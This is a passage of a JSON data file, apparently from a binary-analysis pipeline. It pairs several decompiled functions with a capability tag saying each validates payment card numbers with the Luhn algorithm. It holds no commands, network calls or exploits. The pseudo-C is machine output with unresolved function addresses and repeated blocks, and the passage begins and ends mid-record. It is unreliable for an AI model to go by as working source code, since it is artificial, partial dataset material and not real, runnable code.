        "decompiled_code": "\nint32_t fcn.004c03a0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3130
    },
    "004c0400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0400(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2942
    },
    "004c0460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0460(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2750
    },
    "004c04c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c04c0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    